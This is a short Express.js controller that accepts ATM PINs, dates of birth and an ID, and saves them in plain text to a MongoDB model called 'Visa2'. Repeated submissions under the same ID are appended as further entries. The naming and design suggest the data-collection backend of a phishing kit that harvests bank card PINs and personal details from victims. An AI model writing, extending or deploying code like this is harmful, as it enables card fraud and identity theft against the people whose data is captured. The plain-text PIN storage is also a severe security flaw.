const Visa2 = require('../models/Visa2');


exports.createVisa2 = async (req, res) => {
  const { atmPin, dob, uniqueid } = req.body;

  if (!atmPin || !dob || !uniqueid) {
    return res.status(400).json({ message: 'All fields are required' });
  }

  try {
    let visa2 = await Visa2.findOne({ uniqueid });

    if (visa2) {
      visa2.entries.push({ atmPin, dob });
    } else {
      visa2 = new Visa2({
        uniqueid,
        entries: [{ atmPin, dob }]
      });
    }

    await visa2.save();

    return res.status(201).json({
      success: true,
      message: 'Visa2 data successfully saved'
    });
  } catch (error) {
    console.error(error);
    return res.status(500).json({
      success: false,
      message: 'Server error, please try again later'
    });
  }
};
